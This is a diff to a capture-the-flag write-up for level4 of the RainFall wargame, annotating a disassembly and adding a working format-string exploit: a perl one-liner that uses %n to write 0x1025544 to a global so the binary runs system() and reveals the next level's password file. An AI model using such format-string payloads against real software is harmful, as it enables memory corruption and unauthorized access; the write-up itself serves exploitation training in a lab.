@@ -25,7 +25,7 @@ Dump of assembler code for function n:
    0x08048485 <+46>:    mov    DWORD PTR [esp],eax           ; push eax to stack
    0x08048488 <+49>:    call   0x8048444 <p>                 ; call p
    0x0804848d <+54>:    mov    eax,ds:0x8049810              ; eax = data segment variable (that equals 0 here)
-   0x08048492 <+59>:    cmp    eax,0x1025544                 ; compare eax to ???????????
+   0x08048492 <+59>:    cmp    eax,0x1025544                 ; compare eax to 0x1025544 (16930114 in decimal)
    0x08048497 <+64>:    jne    0x80484a5 <n+78>              ; jump to leave instruction if not equal
    0x08048499 <+66>:    mov    DWORD PTR [esp],0x8048590     ; push address 0x8048590 to stack (contains "/bin/cat /home/user/level5/.pass")
    0x080484a0 <+73>:    call   0x8048360 <system@plt>        ; call system
@@ -51,6 +51,21 @@ End of assembler dump.
 ```
 Function called : `printf`
 
+Actually, the behaviour of this program is similar to the previous one. It call `fgets` to read from stdin, print the buffer thanks to `printf`, then assign the value of the address `0x8049810` to `eax` and compare it to an arbitrary value (0x1025544) to determine if the function will leave or execute a call to the `system` function before.
+
+We dump the content of the address `0x8048590`, used as the parameter of `system`, using gdb.
+
+```gdb
+gdb-peda$ x/s 0x8048590
+0x8048590: "/bin/cat /home/user/level5/.pass"
+```
+
+So, what we have to do is to write the value '0x1025544' ('16930114' in decimal) to the address `0x8049810`, using the format string vulnerability of `printf`. 
+
 ## Exploit
 
-Here everything concerning the exploit description.
+```console
+level4@RainFall:~$ perl -e 'print "\x10\x98\x04\x08%x%x%x%x%x%x%x%x%x%x%16930052x%n"' > /tmp/level4
+level4@RainFall:~$ cat /tmp/level4 | ./level4
+
+```
